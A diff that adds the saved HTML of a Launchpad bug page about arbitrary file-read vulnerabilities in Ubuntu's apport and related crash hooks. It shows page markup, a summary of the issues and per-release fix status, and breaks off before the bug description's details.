@@ -1,0 +1,5136 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
+  <head>
+<base href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+index" />
+
+    <meta charset="UTF-8" />
+    <title>Bug #1917904 “Arbitrary file reads” : Bugs : apport package : Ubuntu</title>
+    <link rel="shortcut icon" href="/@@/launchpad.png" />
+    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1917904" />
+    
+      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1917904/bug.atom" title="Bug 1917904 Feed" />
+    
+
+    
+  
+  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />
+
+
+    
+
+    
+      <meta name="description" content="# Vulnerabilities in Apport
+During a cursory code review, several potential security issues in `apport` and crash-related hooks in packages such as `Xorg` and `openjdk-14-lts` have been identified.
+
+While the issue regarding the `openjdk-14-lts` package is exploitable
+on default installations, the remaining issues most likely are mitigated by the sysctl setting `fs.protected_symlinks` on default Ubuntu installations.
+
+With regard to issues mitigated by `fs.protected_symlinks`, it is not clear..." />
+      <meta property="og:description" content="# Vulnerabilities in Apport
+During a cursory code review, several potential security issues in `apport` and crash-related hooks in packages such as `Xorg` and `openjdk-14-lts` have been identified.
+
+While the issue regarding the `openjdk-14-lts` package is exploitable
+on default installations, the remaining issues most likely are mitigated by the sysctl setting `fs.protected_symlinks` on default Ubuntu installations.
+
+With regard to issues mitigated by `fs.protected_symlinks`, it is not clear..." />
+    
+
+    
+    
+      <meta property="og:title" content="Bug #1917904 “Arbitrary file reads” : Bugs : apport package : Ubuntu" />
+      <meta property="og:type" content="website" />
+      <meta property="og:image" content="/@@/launchpad.png" />
+      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1917904" />
+      <meta property="og:site_name" content="Launchpad" />
+    
+
+    
+
+    
+  
+
+  
+  
+  <script type="text/javascript">
+    var LP = {
+        cache: {},
+        links: {}
+    };
+  </script>
+
+  
+
+  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>
+
+   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
+   <script type="text/javascript">
+        var raw = null;
+        if (LP.devmode) {
+           raw = 'raw';
+        }
+        YUI.GlobalConfig = {
+            combine: true,
+            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
+            root: 'yui/',
+            filter: raw,
+            debug: false,
+            fetchCSS: false,
+            maxURLLength: 2000,
+            groups: {
+                lp: {
+                    combine: true,
+                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
+                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
+                    root: 'lp/',
+                    // comes from including lp/meta.js
+                    modules: LP_MODULES,
+                    fetchCSS: false
+                }
+            }
+        }</script>
+
+  <script type="text/javascript">
+      // we need this to create a single YUI instance all events and code
+      // talks across. All instances of YUI().use should be based off of
+      // LPJS instead.
+      var LPJS = new YUI();
+  </script>
+
+
+
+    <script id="base-layout-load-scripts" type="text/javascript">
+        //<![CDATA[
+        LPJS.use('base', 'node', 'console', 'event',
+            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
+            'lp.app.inlinehelp', 'lp.app.links',
+            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
+            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
+            'lp.views.global',
+             function(Y) {
+
+            Y.on("domready", function () {
+                var global_view = new Y.lp.views.Global();
+                global_view.render();
+
+                Y.lp.app.sorttable.SortTable.init();
+                Y.lp.app.inlinehelp.init_help();
+                Y.lp.activate_collapsibles();
+                Y.lp.app.foldables.activate();
+                Y.lp.app.links.check_valid_lp_links();
+            });
+
+            Y.on('lp:context:web_link:changed', function(e) {
+                  window.location = e.new_value;
+            });
+        });
+        //]]>
+    </script>
+    <script id="base-helper-functions" type="text/javascript">
+         //<![CDATA[
+        // This code is pulled from lp.js that needs to be available on every
+        // request. Pulling here to get it outside the scope of the YUI block.
+        function setFocusByName(name) {
+            // Focus the first element matching the given name which can be focused.
+            var nodes = document.getElementsByName(name);
+            var i, node;
+            for (i = 0; i < nodes.length; i++) {
+                node = nodes[i];
+                if (node.focus) {
+                    try {
+                        // Trying to focus a hidden element throws an error in IE8.
+                        if (node.offsetHeight !== 0) {
+                            node.focus();
+                        }
+                    } catch (e) {
+                        LPJS.use('console', function(Y) {
+                            Y.log('In setFocusByName(<' +
+                                node.tagName + ' type=' + node.type + '>): ' + e);
+                        });
+                    }
+                    break;
+                }
+            }
+        }
+
+        function selectWidget(widget_name, event) {
+          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
+              // Avoid firing if user is tabbing through or simply pressing
+              // enter to submit the form.
+              return;
+          }
+          document.getElementById(widget_name).checked = true;
+        }
+        //]]>
+    </script>
+
+    
+      
+      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["a11y", "appstream", "bionic", "bisect-done", "bitesize", "cherry-pick", "community-security", "desktop-file", "disco", "dist-upgrade", "focal", "ftbfs", "groovy", "hirsute", "hw-specific", "impish", "jammy", "kernel-bug", "manpage", "metabug", "multiarch", "needs-bisect", "needs-design", "needs-packaging", "needs-reassignment", "package-conflict", "packaging", "patch", "patch-accepted-debian", "patch-accepted-upstream", "patch-forwarded-debian", "patch-forwarded-upstream", "patch-needswork", "patch-rejected", "patch-rejected-debian", "patch-rejected-upstream", "performing-bisect", "py2-removal", "qt4-removal", "regression-proposed", "regression-release", "regression-update", "string-fix", "suspend-resume", "systemd-boot", "testcase", "touch", "unmetdeps", "upgrade-software-version", "verification-done-bionic", "verification-done-focal", "verification-done-groovy", "verification-done-hirsute", "verification-done-impish", "verification-done-xenial", "verification-failed-bionic", "verification-failed-groovy", "verification-failed-impish", "verification-failed-xenial", "verification-needed-bionic", "verification-needed-focal", "verification-needed-groovy", "verification-needed-hirsute", "verification-needed-impish", "verification-needed-trusty", "verification-needed-xenial", "wayland", "xenial"];</script>
+      <script type="text/javascript">
+        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
+                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
+                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
+            Y.on('domready', function() {
+                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
+                Y.lp.bugs.bugtask_index.setup_bugtask_index();
+                Y.lp.bugs.bugtask_index.setup_bugtask_table();
+                LP.cache.comment_context = LP.cache.bug;
+                var cl = new Y.lp.app.comment.CommentList();
+                cl.render();
+                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
+                    container_box: '#other-bug-subscribers',
+                    subscribers_details_view:
+                        '/+bug-portlet-subscribers-details',
+                    subscribe_someone_else_link: '.menu-link-addsubscriber'
+                }, window);
+
+                Y.lp.services.messages.edit.setup();
+            });
+         });
+      </script>
+      <style type="text/css">
+        /* Align the 'add comment' link to the right of the comment box. */
+        #add-comment-form textarea { width: 100%; }
+        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
+        #add-comment-form .actions {float: right;}
+        .buglink-summary dd { font-size: 10px; }
+        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
+      </style>
+      <style type="text/css">
+        .yui3-overlay .value label  {
+          /* It normally makes sense for form labels to be bold, but since
+          this form consists only of radio buttons, there's nothing but labels
+          so we just get wall-to-wall bold. */
+          font-weight: normal !important;
+        }
+      </style>
+    
+    
+  </head>
+
+  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
+      main_side
+      public
+      yui3-skin-sam">
+          
+          
+    <div class="yui-d0">
+      <div id="locationbar" class="login-logout">
+        
+
+<div id="logincontrol"><a href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+login">Log in / Register</a></div>
+
+
+
+      </div><!--id="locationbar"-->
+
+      <div id="watermark" class="watermark-apps-portlet">
+        <div>
+          <a href="https://launchpad.net/ubuntu"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/49558155/64_logo.png" /></a>
+        </div>
+        <div class="wide">
+          <h2 id="watermark-heading"><a href="https://launchpad.net/ubuntu">Ubuntu</a><br /><a href="https://launchpad.net/ubuntu/+source/apport">apport package</a></h2>
+        </div>
+        
+  <!-- Application Menu -->
+  <ul class="facetmenu">
+    
+      
+      <li class="overview"><a href="https://launchpad.net/ubuntu/+source/apport">Overview</a></li>
+      
+    
+    
+      
+      <li class="branches"><a href="https://code.launchpad.net/ubuntu/+source/apport">Code</a></li>
+      
+    
+    
+      <li class="bugs active"><a href="https://bugs.launchpad.net/ubuntu/+source/apport">Bugs</a></li>
+      
+      
+    
+    
+      
+      
+      <li class="specifications disabled-tab"><span>Blueprints</span></li>
+    
+    
+      
+      <li class="translations"><a href="https://translations.launchpad.net/ubuntu/+source/apport">Translations</a></li>
+      
+    
+    
+      
+      <li class="answers"><a href="https://answers.launchpad.net/ubuntu/+source/apport">Answers</a></li>
+      
+    
+  </ul>
+
+      </div>
+
+      <div class="yui-t4">
+        <div id="maincontent" class="yui-main">
+          <div class="yui-b" dir="ltr">
+            <div class="context-publication">
+              
+      <h1 id="edit-title">
+<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
+    Arbitrary file reads
+</span>
+  
+</h1>
+
+
+
+    
+              
+
+              <div id="registration" class="registering">
+                
+      Bug #1917904 reported by
+      <a href="https://launchpad.net/~mallle" class="sprite person">mal</a>
+      <time title="2021-03-05 15:54:22 UTC" datetime="2021-03-05T15:54:22.109007+00:00">on 2021-03-05</time>
+    
+              </div>
+            </div>
+
+            
+            <div id="request-notifications">
+              
+            </div>
+
+            
+              <div>
+
+      
+
+      <div id="bug-is-duplicate">
+          
+      </div>
+      
+
+      <div style="float: right;">
+        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">258</a></span>
+      </div>
+
+      
+
+
+  
+  
+    <div class="actions">
+      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
+    </div>
+  
+
+
+
+    <table id="affected-software" class="listing">
+      <thead>
+        <tr>
+          <th colspan="2">Affects</th>
+          <th>Status</th>
+          <th>Importance</th>
+          <th>Assigned to</th>
+          <th>Milestone</th>
+        </tr>
+      </thead>
+
+      <tbody>
+        
+          
+  <tr class="highlight" id="tasksummary2687402">
+    <td>
+      
+    </td>
+    
+    <td>
+      <span id="bugtarget-picker-tasksummary2687402">
+        <span class="yui3-activator-data-box">
+            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/apport" title="Latest release: 2.20.11-0ubuntu72, uploaded to main on 2021-10-27 12:57:09.314067+00:00 by Brian Murray (brian-murray), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)">apport (Ubuntu)</a>
+        </span>
+        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+          Edit
+        </button>
+        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        
+      </span>
+    </td>
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2687402">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr id="tasksummary2717588">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/bionic/+source/apport">Bionic</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/bionic/+source/apport/+bug/1917904/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/bionic/+source/apport/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717588">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr id="tasksummary2717582">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/focal/+source/apport">Focal</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/focal/+source/apport/+bug/1917904/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/focal/+source/apport/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717582">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr id="tasksummary2717584">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/groovy/+source/apport">Groovy</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/groovy/+source/apport/+bug/1917904/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/groovy/+source/apport/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717584">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr id="tasksummary2717586">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/hirsute/+source/apport">Hirsute</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/hirsute/+source/apport/+bug/1917904/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/hirsute/+source/apport/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717586">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr id="tasksummary2717580">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/impish/+source/apport">Impish</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/impish/+source/apport/+bug/1917904/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/impish/+source/apport/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717580">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr style="opacity: 0.5">
+    <td></td>
+    <td>
+      <a class="sprite package-source" href="/ubuntu/+source/openjdk-lts">openjdk-lts (Ubuntu)</a>
+    </td>
+    <td colspan="5"></td>
+  </tr>
+
+
+        
+        
+          
+  <tr id="tasksummary2717589">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/bionic/+source/openjdk-lts">Bionic</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/bionic/+source/openjdk-lts/+bug/1917904/+editstatus" style="float: left" class="value statusNEW">New</a>
+          <a href="https://bugs.launchpad.net/ubuntu/bionic/+source/openjdk-lts/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717589">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr id="tasksummary2717583">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/focal/+source/openjdk-lts">Focal</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/focal/+source/openjdk-lts/+bug/1917904/+editstatus" style="float: left" class="value statusNEW">New</a>
+          <a href="https://bugs.launchpad.net/ubuntu/focal/+source/openjdk-lts/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717583">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr id="tasksummary2717585">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/groovy/+source/openjdk-lts">Groovy</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/groovy/+source/openjdk-lts/+bug/1917904/+editstatus" style="float: left" class="value statusNEW">New</a>
+          <a href="https://bugs.launchpad.net/ubuntu/groovy/+source/openjdk-lts/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717585">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr id="tasksummary2717587">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/hirsute/+source/openjdk-lts">Hirsute</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/hirsute/+source/openjdk-lts/+bug/1917904/+editstatus" style="float: left" class="value statusNEW">New</a>
+          <a href="https://bugs.launchpad.net/ubuntu/hirsute/+source/openjdk-lts/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717587">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+        
+          
+  <tr id="tasksummary2717581">
+    <td>
+      
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/impish/+source/openjdk-lts">Impish</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/impish/+source/openjdk-lts/+bug/1917904/+editstatus" style="float: left" class="value statusNEW">New</a>
+          <a href="https://bugs.launchpad.net/ubuntu/impish/+source/openjdk-lts/+bug/1917904/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary2717581">
+          <span class="yui3-activator-data-box">
+            
+            
+              Unassigned
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    
+  
+
+
+        
+      </tbody>
+
+    </table>
+
+
+
+<div class="actions">
+  
+    <span id="also-affects-product" class="">
+    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+choose-affected-product">Also affects project</a>
+        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
+    </span>
+    <span id="also-affects-package" class="">
+    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+distrotask">Also affects distribution/package</a>
+    </span>
+    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/ubuntu/+source/apport/+bug/1917904/+nominate">Nominate for series</a>
+    
+  
+
+</div>
+
+
+
+
+      <div id="maincontentsub">
+        <div class="top-portlet">
+
+      <div itemprop="mainContentOfPage" class="report">
+        
+
+        <div>
+  <div class="lazr-multiline-edit" id="edit-description">
+  <div class="clearfix">
+    
+
+    <h3>Bug Description</h3>
+  </div>
+
+  <div class="yui3-editable_text-text"><p># Vulnerabilities in Apport<br />
